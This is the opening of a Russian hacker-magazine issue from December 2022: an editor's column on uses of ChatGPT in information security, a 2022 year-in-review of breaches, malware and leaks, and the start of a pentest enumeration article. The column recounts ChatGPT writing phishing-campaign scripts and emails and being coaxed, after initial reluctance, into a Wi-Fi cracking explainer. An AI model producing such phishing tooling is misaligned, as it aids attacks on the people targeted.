
                                                    декабрь 2022
            № 285
CONTENTS

    Инфосек с ChatGPT
   Колонка главреда

    GIGANEWS
  Самые важные и интересные события мира безопасности за 2022 год

    Кунг-фу enumeration
  Собираем информацию об атакуемой системе

    Дельфийские игры
  Реверсим 64-разрядные приложения на Delphi

    Ремесло бинарщика
  Учимся анализировать программы для x86 с нуля

    Get your Xojo
  Реверсим приложение на REALbasic

    HTB Shared
  Повышаем привилегии через уязвимость в Redis

    HTB Outdated
  Повышаем привилегии через службу обновления Windows

    HTB Support
  Проводим классическую атаку RBCD для захвата домена

    HTB Carpediem
  Сбегаем из Docker-контейнеров

     Linux на диете
  Уменьшаем требования Bodhi Linux к оперативной памяти

    Новогодний переполох
  Изучаем электронику с Гринчем

    Титры
  Кто делает этот журнал
                              ПОДПИСКА НА «ХАКЕР»




Мы благодарим всех, кто поддерживает
редакцию и помогает нам компенсировать
авторам и редакторам их труд. Без вас
«Хакер» не мог бы существовать, и каждый
новый подписчик делает его чуть лучше.




                        Напоминаем, что дает годовая подписка:

                            год доступа ко всем материалам, уже
                        опубликованным на Xakep.ru;
                            год доступа к новым статьям, которые
                         выходят по будням;
                         полное отсутствие рекламы на сайте
                           (при условии, что ты залогинишься);
                         возможность скачивать выходящие
                       каждый месяц номера в PDF, чтобы
                           читать на любом удобном устройстве;
                       личную скидку 20%, которую
                      можно использовать для продления
                          годовой подписки. Скидка накапливается
                               с каждым продлением.

                         Если по каким-то причинам у тебя еще нет
                           подписки или она скоро кончится,
                              спеши исправить это!
HEADER





   ИНФОСЕК
   С CHATGPT

         КОЛОНКА ГЛАВРЕДА



2022 год начался с Wordle, а закончился
другой увлекательной игрой, результаты
которой  наводнили  соцсети, —  сорев‐
нованиями по  вытягиванию  разумного,
смешного и полезного из ChatGPT. И если       Андрей Письменный                                                                                      Главный редактор
зеленые и желтые квадратики быстро всех         apismenny@gmail.com
утомили, то серые прямоугольники с тек‐
стом неизменно вызывают бурю эмоций:
от восторгов до страха за судьбу челове‐
чества.


Сразу хочу предупредить: никаких прозрений по поводу будущего ИИ у меня
нет. Как и все, я дивлюсь тому, какой путь машинное обучение прошло за пос‐
ледние пять лет, и пытаюсь прикинуть, что будет еще через пять. Поэтому
просто выступлю в жанре TJournal (светлая ему память), где была полезней‐
шая, на мой взгляд, рубрика: в ней брали какой‑то новый мем и собирали
из соцсетей лучшие экземпляры творчества на его тему. Только вместо мемов
у нас будут примеры использования ChatGPT в инфобезе.


Что за ChatGPT?
ChatGPT (Chat Generative Pre-trained Transformer) — это модель языка, которая
была обучена на большом корпусе текста для генерации ответов в чат‑ботах.
Она была разработана OpenAI и является разновидностью технологии пред‐
варительно обученных трансформеров (Pre-trained Transformer).
   Предварительно обученные трансформеры — это модели, которые были
обучены на большом корпусе текста для задачи токенизации (разбиения текста
на отдельные слова и символы) и затем используются для решения различных
задач на основе этой информации. После предварительного обучения модель
может быть дообучена для решения конкретной задачи, например генерации
текста или классификации документов. ChatGPT был специально разработан
для использования в чат‑ботах.
   ChatGPT был разработан компанией OpenAI. OpenAI — это некоммерчес‐
кая   организация,  которая  занимается  исследованием   искусственного
интеллекта и его применения. Она основана в 2015 году и считается одним
из ведущих игроков в области искусственного интеллекта. OpenAI разработала
множество моделей языка, в том числе GPT и GPT-2, которые также являются
предварительно обученными трансформерами.
   Обычно люди удивляются тому, насколько хорошо ChatGPT справляется
с генерацией ответов в чат‑ботах. Она умеет отвечать на различные вопросы,
выполнять команды и даже постить шутки. Часто ChatGPT удивляет людей сво‐
ей способностью генерировать текст, который читается натурально и не отли‐
чается от текста, написанного человеком.
   Текст этой врезки сгенерирован при помощи ChatGPT в ответ на воп-

росы «Что такое ChatGPT?», «Кто разработал ChatGPT?» и «Почему
ChatGPT поражает людей?»



Как видишь,  писать  рефераты ChatGPT  умеет  складно. Но это далеко
не единственное применение. При помощи ChatGPT генерируют код на раз‐
ных языках, и этот код даже иногда запускается и работает как положено. И в
информационной безопасности применений тоже предостаточно.
   Вот пользователь @gf_256 просит ChatGPT глянуть на исходник смарт‑кон‐
тракта, а тот корректно идентифицирует потенциальную уязвимость.





Еще пример того же  пользователя: ChatGPT показывают  задачку с CTF,
в которой нужно забрать флаг из приложения на Flask. Нейросеть подробно
рассказывает о том, как это можно проделать при помощи Burp Suite.





А вот пример поиска уязвимостей в веб‑сервере на Python и Flask за авторс‐
твом @dyngnosis. На этот раз ChatGPT составил подробный список потен‐
циальных дыр и сгенерировал готовый скрипт с перебором нагрузок.





Как насчет дел бинарных? В примере @JusticeRage ChatGPT дают посмотреть
на свежий вывод дизассемблера, и нейросетка определяет, что это криптогра‐
фическая функция, и описывает алгоритм ее работы.





А вот @breakersall использует ChatGPT для организации фишинговой кам‐
пании. Нейросеть по запросу пишет скрипт для деплоя evilginx2 в AWS.





Настраивает файрвол.





И выдает скрипт на Python для регистрации домена.





Затем пишет фишинговое письмо и скрипт для его рассылки. Под конец еще и
генерирует отчет (картинки кликабельные).





Еще мне очень понравилось, как ChatGPT придумал несуществующий язык
программирования Sack, а потом стал писать программы на нем.
  Но окончательно покорила история с «виртуальной машиной». ChatGPT
попросили представить, что он терминал на машине с Linux, и отвечать на пос‐
тупающие команды bash. Дальше пользователь ходит по каталогам, открывает
файлы, запускает команды, делает сетевые запросы, а нейросеть пытается
сделать вид, что это действительно настоящий компьютер, и дать реалис‐
тичный вывод. Такая вот сисадминская версия Dungeons & Dragons, где
гейм‑мастер — нейросеть.
   Сооснователь и исполнительный директор OpenAI Сэм Альтман пишет :


      ChatGPT сейчас невероятно ограничен, но кое в чем достаточно хорош,
       чтобы создать ложное  впечатление величия. Будет ошибкой сейчас«
      на него полагаться в чем‑то важном. Это превью прогресса: нам пред-
        стоит еще много работы над гибкостью и точностью.                »
Как хороши будут ягодки, коль так хороши цветочки? Да и вообще, в хакерском
деле точный инструмент иногда и не нужен. Бывает достаточно догадки, а уж
ее проверкой пока что займется человек.
   Насмотревшись  примеров  в  интернете,  я  тоже  пошел  пообщаться
с ChatGPT. Первым делом хотелось узнать, насколько хорошо он справляется
с задачами авторов «Хакера». Вопрос за вопросом я стал вытягивать из ней‐
росетки статью про взлом Wi-Fi.
   ChatGPT, как видишь, немного пококетничал, сторонясь пикантной темы,
но под конец таки разговорился и пошел сочинять эксплейнер про перехват
хендшейков и Aircrack-ng.





Неплохо! Но живые авторы нам по‑прежнему нужны (кстати, если хочешь стать
одним из них, шли темы на pismenny@glc.ru ). Я же не удержался и стал про‐
сить нейросеть сочинить балладу о кротовухе. На этом работа встала.



                                       Продолжение статьи                        →
                                      Мария «Mifrill» Нефёдова
                                                  nefedova@glc.ru


До нового года осталось всего ничего, а значит, пора под‐
вести  итоги и  вспомнить самые  интересные,  важные
и странные события последних двенадцати месяцев. Мы
уже выбрали «призеров» в десяти номинациях и готовы
рассказать тебе о наиболее заметных атаках, взломах,
утечках, фейлах и других событиях уходящего 2022-го.

             АТАКА ГОДА
     LAPSUS$





От хакерских атак постоянно страдают компании и организации по всему миру,
но мало кому удается устроить такой марафон взломов, какой в этом году про‐
демонстрировала хак‑группа Lapsus$. Всего за несколько месяцев эти парни
успели скомпрометировать и пошантажировать Nvidia, слить исходные коды
Ubisoft, Microsoft и Samsung, взломать компанию Okta.
   Лидером  Lapsus$  считают  17-летнего  подростка из  Великобритании,
которого, наряду с другими участниками группы, уже арестовали власти. Одна‐
ко после этих задержаний атаки не прекратились, и «список заслуг» группиров‐
ки пополнился не менее громкими взломами Uber и Rockstar Games (из‑за
которого в сеть утекли десятки видео с геймплеем GTA VI и куски исходных
кодов компании).
  В настоящий момент неясно, сколько еще участников Lapsus$ могут оста‐
ваться на свободе.


Другие громкие взломы 2022 года
 1. Кросс‑чейн‑мост Nomad лишился 200 миллионов долларов из‑за взлома.
  Одна из крупнейших криптовалютных атак года, которую эксперты назвали
   «первым в истории децентрализованным массовым ограблением».
 2. Вредонос RuRansom уничтожает данные в российских системах. В отличие
   от обычных шифровальщиков, которые вымогают выкуп, автор RuRansom
   не просит денег, а просто стремится причинить больше ущерба.
 3. Поезда в Дании остановились из‑за кибератаки. Работа Государственных
   железных дорог Дании (DSB) оказалась парализована на несколько часов
   из‑за атаки на стороннего поставщика ИТ‑услуг — компанию Supeo.
 4. Сотни новостных сайтов в США скомпрометированы и заражены вредоно‐
  сом  SocGholish .  Вредоносное  ПО   обнаружили  на   сайтах  более
   чем 250 американских новостных агентств.
 5. Группировка Yanluowang взломала компанию Cisco. В компании заверили,
   что хакеры сумели похитить только неконфиденциальные данные.




Год от года мощность DDoS-атак бьет всё новые рекорды. В 2022 году произошло сразу нес‐
колько крупных инцидентов, вновь «повысивших планку» в этой области.


Клиент компании Imperva, неназванный китайский поставщик телекоммуникационных услуг, под‐
вергся атаке, которая длилась более четырех часов, и за это время жертва суммарно
получила 25,3 миллиарда запросов. Пиковая мощность атаки составила 3 900 000 зап‐
росов в секунду.


Специалисты  Microsoft  рассказали,  что  отразили  масштабную  DDoS-атаку,  нацеленную
на неназванного клиента Azure из Азии. Мощность атаки составила рекордные 3,47 Тбит/с .

             УТЕЧКА ГОДА
   РОССИЙСКИЕ
   КОМПАНИИ





К сожалению, в этом году бесспорными лидерами по количеству утечек данных
стали российские компании. Посуди сам: за год в сеть попали личные данные
пользователей Яндекс Еды и  Delivery Club, «Почты России»,  провайдера
«Дом.ру », сервиса покупки билетов «Туту.ру », онлайн‑магазинов «Вкусвилл»,
DNS и «Онлайн‑трейд », кикшеринга Whoosh , медицинской лаборатории «Ге‐
мотест », сервисов CDEK.Shopping и «СДЭК.Маркет», сайта Pikabu , участников
программы лояльности Tele2 — и на этом список не исчерпывается.
   Отдельного упоминания также стоит серия утечек , которую специалисты
Минцифры связывают с «Почтой России», а хакеры заявляют, что украли дан‐
ные пользователей «Госуслуг», якобы полученные из Единой системы иден‐
тификации и аутентификации.
   Недавно эксперты Group-IB и вовсе сообщили, что только за три летних
месяца 2022 года в сеть попало 140 баз российских компаний, а общее
количество строк в этих сливах равняется примерно 304 миллионам.
  На фоне участившихся утечек Минцифры рассматривает возможность ввес‐
ти оборотные штрафы для компаний в размере 3% от оборота. Глава минис‐
терства Максут Шадаев считает, что это будет стимулировать бизнес вкла‐
дываться в безопасность данных.


Другие утечки 2022 года
 1. Хакеры  похитили  информацию  и  хранилища  паролей  пользователей
   LastPass. Злоумышленники  проникли в облачное хранилище компании,
   и теперь пароли пользователей в теории могут быть взломаны.
 2. Данные 5,4 миллиона пользователей Twitter попали в открытый доступ.
   Информация,  украденная с помощью  уязвимости  API,  бесплатно  рас‐
   пространяется в сети.
 3. Произошла утечка документации и BIOS для процессоров Intel Alder Lake.
   У производителя украли исходный код, приватные ключи, журналы изме‐
   нений и инструменты компиляции для UEFI BIOS.
 4. В даркнете продают данные миллиарда граждан Китая. Злоумышленник
   оценил дамп в 10 биткоинов, и эта утечка может быть самой серьезной
   из когда‑либо затрагивавших Китай.
 5. Утекшие исходники шифровальщика Conti используются для атак на рос‐
   сийские компании. Раскол в хак‑группе привел к утечке исходных кодов
   опасной малвари.


 Даже в 2022 году список самых распространенных и ненадеж‐
ных паролей по‑прежнему возглавляет password , а за ним сле‐
           дуют 123456 , 123456789, gest и qwerty.
    На взлом таких паролей требуется от < 1 до 11 секунд.

       ИССЛЕДОВАНИЕ ГОДА
  ВЗЛОМ CAPTCHA
   В ДАРКНЕТЕ





Научные доклады на  сотни  страниц и  исследовательские статьи обычно
получают куда меньше внимания от прессы и пользователей, чем очередной
взлом, скам, утечка данных или ограбление криптовалютной биржи. Но зачас‐
тую именно из таких трудов «вырастают» новые векторы и методы атак и бла‐
годаря им обнаруживаются опасные уязвимости.
  В прошедшем году интересных ресерчей было немало. Например, группа
исследователей из университетов Аризоны, Джорджии и Южной Флориды соз‐
дала мощный инструмент DW-GAN для решения CAPTCHA на ресурсах даркне‐
та. По утверждению авторов, DW-GAN может обойти 94,4% защитных механиз‐
мов на андеграундных сайтах.
   Сложность заключалась в том, что практически все сайты даркнета исполь‐
зуют CAPTCHA собственной разработки, и раньше создание инструмента,
который мог бы решить большинство из них, попросту считали невозможным.


Другие исследования 2022 года
 1. К зашифрованным архивам ZIP подходят два разных пароля. Оказалось,
   у запароленных архивов может быть сразу два правильных пароля, причем
   оба дадут одинаковый результат при извлечении файлов.
 2. Исследователь показал, как извлечь текст из пикселизированных изоб‐
   ражений. Если нужно скрыть текст на картинке, лучше использовать прос‐
   тые черные полосы, закрывающие его полностью. Пикселизацию, размытие
   и искажение можно снова превратить в читаемый текст.
 3. Продемонстрирована  атака  «браузер в  браузере»,  позволяющая  под‐
   делывать окна в Chrome. Эксперт создал новый метод атак на браузеры,
   который  позволяет  создавать  фишинговые  формы  входа,  используя
   для этого фейковые окна.
 4. Mozilla: на YouTube практически не работают кнопки «Не нравится» и «Не
   интересно». Инженеры Mozilla долго изучали алгоритмы YouTube и пришли
   к выводу, что кнопки обратной связи на платформе практически не работа‐
   ют.
 5. Угнать за 130 секунд: баг позволяет добавить новый NFC-ключ для авто‐
   мобиля  Tesla. Член  хакерского  исследовательского  коллектива  Trifinite
   Group, занимающегося проблемами BLE, продолжает изучать и ломать про‐
   дукцию Tesla.


 Хакеры ломают хакеров: за последние 12 месяцев мошенники
  выманили у своих «коллег» более 2 500 000 долларов только
 на трех отдельных хак‑форумах: Exploit , XSS и BreachForums.

        УЯЗВИМОСТЬ ГОДА
  PROXYNOTSHELL





В этой номинации хочется порадоваться тому, что не каждый год специалис‐
там приходится сталкиваться с проблемами масштаба Heartbleed, Meltdown
и Spectre или WannaCry. Среди багов «калибром» поменьше в этом году явно
выделялись уязвимости ProxyNotShell , родственные старому багу ProxyShell
и благодаря этому получившие название.
   Уязвимости в Microsoft Exchange вызвали такой интерес среди злоумыш‐
ленников, что в сети даже пытались продавать фейковые эксплоиты для них.


Другие уязвимости 2022 года
 1. Уязвимость Follina превратили в оружие, но Microsoft не торопится с патчем .
   Проблема нулевого дня в Microsoft  Office  стала настоящим подарком
   для хакеров, а патч разрабатывали несколько месяцев.
 2. Смартфоны Xiaomi с чипами MediaTek уязвимы перед подделкой платежей.
   Пользователям посоветовали отказаться от мобильных платежей и свести
   к минимуму количество установленных на устройстве приложений.
 3. В OpenSSL патчат уязвимость, сравнимую с Heartbleed по степени серь‐
   езности. Проблема представляла угрозу для 64-разрядных систем с под‐
   держкой Intel AVX-512 (Advanced Vector Extensions 512).
 4. В антивирусах Avast и AVG нашли баги десятилетней давности. Хакеры
   с ограниченными привилегиями могли выполнить код в режиме ядра и в
   итоге получить полный контроль над устройством.
 5. Apple M1 уязвим для атаки PACMAN, и это нельзя исправить . Баг носит
   аппаратный  характер и  связан  с  аутентификацией  указателя  (pointer
   authentication), позволяя выполнять произвольный код на уязвимом устрой‐
   стве.


  В Qrator Labs считают , что отказоустойчивость Рунета ухуд‐
  шается: в этом году Россия потеряла сразу 8 позиций, смес‐
       тившись на 10-е место в общемировом топ-20.

        БЛОКИРОВКА ГОДА
 СОЦИАЛЬНЫЕ СЕТИ





Пожалуй, это будет самый грустный раздел нашего дайджеста. О блокировках,
с которыми  российские  пользователи  столкнулись в 2022  году,  можно
написать цикл статей и все равно упустить из вида что‑нибудь важное. Ведь
в реестр запрещенных сайтов в 2022 году было внесено 247 492 ссылки
на сайты или конкретные страницы в интернете.
   Наиболее знаковым «баном» этого года, по нашему мнению, стала бло‐
кировка социальных сетей Twitter, Facebook* и Instagram* , а также признание
деятельности компании Meta Platforms** экстремистской с последующим зап‐
ретом на территории России.
   Теперь Facebook* и Instagram* ежедневно пользуются лишь 0,2% и 8%
населения.
  В числе прочего в РФ были отключены и рекламные инструменты YouTube
и Google Ads, из‑за чего российские блогеры потеряли 80–90% своего дохода,
а лидерство среди соцсетей в РФ теперь держат «Вконтакте» и Telegram, чей
трафик заметно увеличился за прошедший год.


Другие блокировки 2022 года
 1. Арестованы двое россиян, которых обвиняют в управлении теневой биб‐
   лиотекой Z-Library. Американские власти начали борьбу с Z-Library: Минюст
   и ФБР конфисковали более 130 доменов библиотеки, а также арестовали
   предполагаемых администраторов ресурса.
 2. Российским  пользователям  заблокировали  обновление  до  Windows
   11 22H2 .  Загрузить с  официального  сайта  Microsoft  образы Windows
   10 и 11, а также другие файлы тоже не получается без VPN.
 3. Американские власти наложили санкции на криптовалютный миксер Tornado
   Cash . Разработчик сервиса арестован, а представители криптоиндустрии
   считают это неправомерным и подали в суд на Министерство финансов
  США.
 4. Роскомнадзор заявил о блокировке VPN-сервисов, включая Proton VPN.
  В этом году было забанено множество VPN-сервисов, но Proton VPN стал
   одной из самых значимых потерь.
 5. GitHub блокирует аккаунты российских банков и разработчиков. К сожале‐
   нию, такие проблемы давно возникают у разработчиков из стран, находя‐
   щихся под санкциями США.


 Вымогательские группировки снижают свои запросы: по срав‐
 нению с прошлым годом величина выкупов снизилась более
чем в 20 раз, а цены на шифровальщики в даркнете упали в 10–
                              12 раз.

   НАРУШИТЕЛЬ ПРИВАТНОСТИ ГОДА
      IPHONE





В прошлом году мы назвали главным нарушителем приватности Android, одна‐
ко устройства Apple тоже таят в себе немало проблем. К примеру, специалисты
из Дармштадтского технического университета обнаружили, что для iPhone
можно создать вредоносное ПО, которое будет работать даже на выключен‐
ном устройстве. И хотя такая малварь существует лишь в качестве исследова‐
тельского концепта, в мобильных устройствах под управлением iOS действи‐
тельно есть ряд чипов, продолжающих работать, даже когда питание отсутс‐
твует. Теоретически это может превратить выключенный телефон в устройство
для слежки за его владельцем.
   Среди других проблем с приватностью, обнаруженных в этом году в iOS,
можно отметить атаку NoReboot , которая помогает имитировать процесс вык‐
лючения устройства, хотя на самом деле iPhone по‑прежнему работает, и баг ,
который позволял подслушивать разговоры пользователей с Siri и записывать
аудио диктовки текста.


Другие новости приватности 2022 года
 1. Пользователи Android смогут отключить 2G и защититься от атак перех‐
   ватчиков. Google наконец предоставила людям возможность не разрешать
   соединения 2G на своих устройствах.
 2. Обновленный  Tor  Browser  автоматически  обходит  ограничения.  Поль‐
   зователям больше не придется вручную перебирать конфигурации мостов.
 3. Google: шпионское ПО атакует пользователей iOS и Android при поддержке
   интернет‑провайдеров. Легальная спайварь RCS Lab полагается на помощь
   интернет‑провайдеров в некоторых странах.
 4. Браузер DuckDuckGo разрешал работу трекеров Microsoft . После скандала
   разработчики объявили, что их браузер все же будет блокировать все сто‐
   ронние следящие скрипты Microsoft, хотя ранее это было невозможно из‑за
   соглашения о поиске, заключенного между компаниями.
 5. Исследователи говорят, что VPN в iOS по‑прежнему не работает нормаль‐
   но. VPN-приложения всё так же не могут шифровать весь трафик в iOS.


  В среднем на исправление 0-day-багов у компаний уходит
 52 дня , тогда как еще три года назад для этого требовалось
                     в среднем 80 дней.





                                       Продолжение статьи →
← Начало статьи

           МАЛВАРЬ ГОДА
  RASPBERRY ROBIN





  В «Хакере» мы каждый день рассказываем о новой малвари, угрозах, дар‐
   кнет‑сервисах и вредоносных  кампаниях. Выбирать «победителя» в этой
   категории всегда трудно, ведь нельзя с точностью сказать, что хуже: появление
  новой версии известного шифровальщика LockBit 3.0 (авторы которого к тому
  же запустили собственную программу bug bounty ) или появление в продаже
  нового UEFI-буткита Black Lotus.
     Так как многочисленные вымогатели и стилеры уже давно никого не удив‐
   ляют, на общем фоне заметно выделился дроппер Raspberry Robin, обла‐
  дающий функциональностью червя. Его авторы продают доступы к скомпро‐
   метированным сетям вымогательским группировкам и операторам другой
   малвари.
      Raspberry Robin заразил тысячи организаций по всему миру, что особенно
   примечательно, так как распространяется он с помощью USB-накопителей
   (заражает устройства вредоносным ПО после клика по файлу .LNK).
      Эксперты  связывают  его  с  такими  небезызвестными  хак‑группами,
   как FIN11 и Clop, а также с распространением полезных нагрузок вредоносов
  Bumblebee, IcedID и TrueBot.


  Другие заметные вредоносы 2022 года
    1. Сервис Parrot TDS использует 61 000 сайтов для распространения малвари.
       Parrot опирается в работе на взломанные серверы, где размещаются сайты
      университетов, муниципальных органов власти, контент для взрослых и лич‐
     ные блоги.
    2. Хакеры злоупотребляют возможностями Brute Ratel C4 . В сети обнаружили
      взломанную версию red team инструмента Brute Ratel. Не Cobalt Strike’ом
     единым…
    3. За рекордными DDoS-атаками на клиентов Cloudflare стоял ботнет Mantis.
      Всего за 30 дней наблюдений Mantis запустил более 3000 DDoS-атак,
     которые были направлены против почти 1000 клиентов Cloudflare.
    4. Вымогательская группировка Conti прекратила работу и распалась на нес‐
      колько групп поменьше. Хотя бренда Conti больше не существует, экспер‐
     ты уверены, что этот преступный синдикат еще долго будет играть важную
     роль в вымогательской «индустрии».
    5. Ботнет Emotet возобновил активность после пяти месяцев простоя. Emotet
     по‑прежнему жив и продолжает массовые рассылки вредоносного спама.


   По данным Роскомнадзора, с начала специальной военной
   операции на Украине произошло более 140 утечек персональ‐
   ных данных и в сеть попали примерно 600 миллионов записей
                       о россиянах.

       ХАРДВЕРНЫЙ ВЗЛОМ ГОДА
  ТЕРМИНАЛ SPACEX





   Специалист из  Левенского  католического  университета Леннерт Воутерс
   (Lennert Wouters) в деталях рассказал, как ему удалось осуществить один
  из первых взломов терминалов Starlink с помощью самодельного мод‑чипа
   стоимостью 25 долларов. Воутерс заявил, что намерен сделать этот инстру‐
  мент полностью доступным для копирования.
       Хотя SpaceX выпустила обновление, чтобы затруднить потенциальные атаки
   (в ответ Воутерс изменил свой мод‑чип), основная проблема не может быть
   исправлена, пока компания не обновит железо. По этой причине все поль‐
   зовательские терминалы  Starlink по‑прежнему уязвимы, хотя после  патча
   реализовать атаку стало заметно труднее.


  Другие «железные» новости 2022 года
    1. Песня Джанет Джексон выводила из строя жесткие диски в старых ноут‐
      буках.  Музыкальный  клип на  песню Rhythm  Nation  негативно  влиял
     на некоторые жесткие диски со скоростью вращения 5400 об/мин. Виноват
     в этом был обычный резонанс.
    2. Вышла обновленная версия хакерского инструмента USB Rubber Ducky.
      Авторы обновили DuckyScript (язык, который используется для создания
      команд),  научили устройство определять,  подключено оно к Windows-
    машине или Mac, а также генерировать псевдослучайные числа.
    3. Появился PoC-эксплоит для PlayStation 5. Он срабатывает лишь в 30% слу‐
     чаев. Разработчики заявляют, что это важный шаг на пути к полному взлому
      консоли.
    4. Кабель O.MG Elite получил расширенные сетевые возможности. Новинка
      способна  поддерживать  двухстороннюю  связь  со  своим  оператором
     и может похвастаться увеличенным хранилищем для полезных нагрузок.
    5. Создано устройство TickTock, способное обнаруживать прослушку . Девайс,
      построенный на базе Raspberry Pi 4 Model B, может проверить, не исполь‐
       зуется ли микрофон ноутбука или смартфона для тайной записи разговоров
      пользователя.


    Опрос StackOverflow показал: в 2022 году 40,23% разработ‐
   чиков предпочли использовать Linux в качестве основной ОС.
  Однако первое место все равно удерживает Windows с резуль‐
                       татом в 62,33% .

          СТРАННОСТЬ ГОДА
     ДОБРЫЙ
  ШИФРОВАЛЬЩИК





   Далеко не все события, происходящие в областях ИТ и инфосека, можно
   отнести к разряду серьезных, а некоторые инциденты и вовсе напоминают то
  ли первоапрельскую шутку, то ли нарочито абсурдные фальшивые новости
   в стиле ИА «Панорама».
    Один из ярких примеров — вымогатель GoodWill , который не требует у пос‐
   традавших  деньги, но  заставляет  их  совершать  добрые дела в обмен
  на дешифрование файлов. К примеру, операторы вредоноса велят раздавать
   одежду бездомным или оплачивать медицинские счета тем, кто нуждается
   в срочной медицинской помощи, но не может себе этого позволить.
      GoodWill распространяется преимущественно в Индии и, судя по всему,
  был создан в этой же стране. Исследователи считают, что шифровальщик явля‐
   ется чьим‑то экспериментом.


  Другие странные новости 2022 года
    1. Школьники нашли баг в терминалах самообслуживания «Вкусно — и точка»
     и ели гамбургеры бесплатно. Отключение питания терминала автоматичес‐
     ки возвращало деньги за последний заказ.
    2. Француз  случайно лишил  интернета целый город,  пытаясь  отключить
     интернет своим детям . Отец семейства использовал «глушилку», чтобы
      заблокировать своим детям доступ к сети, а в итоге оставил без связи всех
     соседей.
    3. Взломан анонимный сайт для рассылки фекалий по почте. Скучающий хакер
      взломал ShitExpress и опубликовал несколько особенно забавных посланий,
      которыми клиенты сервиса сопровождали свои «заказы».
    4. Создатель Oculus Rift показал VR-гарнитуру, которая убьет пользователя,
     если тот умер в игре. Палмер Лаки вдохновился идеями из Sword Art Online
     и сконструировал по‑настоящему убийственный гаджет.
    5. Google отправила инженера в оплачиваемый отпуск, когда тот заявил, что
    ИИ компании обрел сознание. Программист Google опубликовал интервью
     с чат‑ботом LaMDA (Language Model for Dialogue Applications), в котором ИИ
      признался, что испытывает чувство одиночества и жаждет духовных знаний.


     Самым популярным языком программирования на GitHub
    по‑прежнему остается JavaScript . Второе место занимает
  Python , третье — Java. Эти лидеры не меняются уже несколько
                                  лет.

            ФЕЙЛ ГОДА
         FTX





  Осенью 2022 года криптовалютное сообщество пережило серьезное  пот‐
  рясение — неожиданный крах биржи FTX, которая еще недавно считалась
  одной из крупнейших в мире наряду с Binance и Coinbase и оценивалась
   в 32 миллиарда долларов. Крах и банкротство FTX оказали огромное влияние
  на всю индустрию, а последствия произошедшего еще долго будут сказывать‐
   ся на всем рынке в целом.
    В этой истории есть все необходимые составляющие для настоящего эпик‐
   фейла: пропавшие миллиарды, обманутые инвесторы и вопиющая халатность.
  К примеру, главы FTX регулярно тратили средства на покупку предметов рос‐
  коши и элитной недвижимости на Багамах, ведь оказалось, что никакого кон‐
   троля расходов в компании вовсе не было: платежи утверждались с помощью
   персонализированных эмодзи в онлайн‑чатах.
     Бывший глава и основатель FTX Сэм Бэнкман‑Фрид уже экстрадирован
   в США после ареста на Багамских островах. Правда, на родине его сразу же
   освободили под залог в размере 250 миллионов долларов и отправили
  под домашний арест.
      Теперь Бэнкману‑Фриду и другим бывшим руководителям FTX и фонда
  Alameda Research грозит тюремное заключение сроком 110–115 лет.


  Другие провалы 2022 года
    1. Инфотеймент‑системы в автомобилях Mazda отключились  после  прос‐
      лушивания радиостанции в Сиэтле. Радиостанция транслировала через HD
     Radio файлы изображений, не имевшие расширений, а инфотеймент‑сис‐
     темы автомобилей 2014–2017 годов выпуска обязательно должны «знать»
     расширение файла.
    2. Японские компании оказались не готовы к отключению Internet Explorer.
     Прекращение поддержки IE спровоцировало настоящий хаос в Японии, где
      браузер по‑прежнему в ходу у многих компаний и госструктур.
    3. В Telegram аннулировали подписки Premium, полученные обманным путем .
     Трое школьников нашли способ создания бесплатных Premium-подписок,
       стали продавать их и довели этот «бизнес» до абсурда.
    4. Акции фармацевтической компании подешевели из‑за фальшивого твита
     про бесплатный инсулин . Из‑за фейковой новости компания Eli Lilly потеря‐
     ла больше 16 миллиардов рыночной капитализации.
    5. Мошенники обманули банкоматы «Альфа‑банка» с помощью купюр «банка
      приколов». Преступники внесли в банкоматы фальшивые купюры на общую
      сумму более 60 миллионов рублей, после чего сняли уже настоящие день‐
       ги.


 ЧЕМ ЕЩЕ ЗАПОМНИТСЯ 2022 ГОД

   Разработчики Winamp, о которых в 2022 году вряд ли вспоминало много людей, сдержали свое
   обещание и все же выпустили новую версию легендарного плеера (Winamp 5.9). Подготовка
   к обновлению и перезапуску Winamp велась с 2018 года.


  В начале года ФСБ РФ заявила, что члены нашумевшей хак‑группы REvil арестованы по запросу
   властей США. Это сообщение посеяло настоящую панику в рядах хакеров, но к ноябрю дело
    окончательно зашло в тупик, так как, по данным СМИ, американская сторона «в одностороннем
   порядке вышла из переговорного процесса».


   Национальный институт стандартов и технологий США (NIST) сообщил об отказе от исполь‐
   зования криптографического алгоритма SHA-1 и рекомендовал полностью перейти на более
   безопасные SHA-2 и SHA-3 до 31 декабря 2030 года.


   Илон Маск  купил  компанию  Twitter за 44  миллиарда долларов,  сразу же  уволил весь
   топ‑менеджмент, две трети сотрудников и теперь так активно модернизирует соцсеть, что
    Twitter  лишился  многих  крупных  рекламодателей,  а  пользователи  массово  переходят
   в Mastodon.


   15 июня 2022 года  Microsoft  окончательно  «похоронила»  Internet  Explorer,  отказавшись
   от использования устаревшего браузера. Теперь пользователей сразу переадресуют в Edge,
   хотя специальный режим IE в Microsoft Edge будет  поддерживаться по меньшей мере
   до 2029 года, что даст разработчикам долгих восемь лет на модернизацию устаревших при‐
   ложений.



   * Принадлежат компании Meta, деятельность которой признана экстре-

   мистской, организация запрещена в России.

   ** Meta Platforms Inc. признана экстремистской организацией и зап-
  рещена в РФ.
COVERSTORY





      СОБИРАЕМ ИНФОРМАЦИЮ
      ОБ АТАКУЕМОЙ СИСТЕМЕ





Разведка и сбор данных при пентесте —
не одно и то же. Recon  (разведка) —
это пассивные действия, а Enum (сбор
данных) — активные. Разведка подразуме‐
вает работу исключительно с открытыми               s0i37                                                                                  Lead cybersecurity analyst at
источниками (OSINT), при этом целевая      USSC t.me/s0i37_channel                                                                                              s0i37@ya.ru
система никак не затрагивается, то есть
все  действия  выполняются  анонимно.
А вот когда наступает этап enumeration,
или сбора данных, мы начинаем взаимо‐
действовать с целями. Об этом важном
этапе тестирования на проникновение мы
сегодня и поговорим.


Фраза «Enumeration is the key» широко известна в среде пентестеров. Вначале
пентестеры обычно сканируют порты, определяя службы и выполняя спе‐
цифичные тесты для каждого. И тут начинающие часто допускают грубые
ошибки, ведь сканирование портов может быть расценено удаленной сто‐
роной как сетевая атака.
   Enumeration — это целое искусство. Оно заключается в умении легитимно,
без  использования  каких‑либо  уязвимостей,  а  полагаясь  исключительно
на поведение приложения вытащить из исследуемого сервиса или открытого
порта столько информации, сколько возможно. И чем больше такой информа‐
ции получит хакер, тем проще ему будет на следующих этапах.
   Сегодня на серверах крутится столько разнообразных служб, что описания
всех приемов для каждой из них хватило бы на целую книгу. Поэтому сегодня
мы коснемся самых основ, того, на чем работает каждый сервис, — стека про‐
токолов TCP/IP. Думаю, ты крайне удивишься, узнав, сколько информации
